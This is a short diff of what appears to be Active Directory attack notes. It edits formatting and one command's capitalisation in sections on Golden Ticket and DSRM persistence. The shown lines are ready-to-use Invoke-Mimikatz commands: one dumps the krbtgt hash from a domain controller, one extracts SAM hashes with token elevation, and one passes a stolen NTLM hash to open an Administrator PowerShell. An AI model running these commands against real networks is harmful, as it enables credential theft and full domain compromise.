@@ -1,6 +1,8 @@
 ++++++++++++++++++
 Golden Ticket:
 ++++++++++++++++++
+
+
 Once we get inside DC with the privileges of Domain Administrator, we can execute following command to get krbtgt hash:
 > Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC_computer>
 
@@ -53,6 +55,6 @@ Note: Domain admin prives are required
 > Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <domain_controller>
 
 After obtaining the DSRM hash:
-> Invoke-Mimikatz -COmmand '"sekurlsa::pth /domain:<DC-computer> /user:Administrator /ntlm:<dsrm_hash> /run:powershell.exe"'
+> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC-computer> /user:Administrator /ntlm:<dsrm_hash> /run:powershell.exe"'
 
 
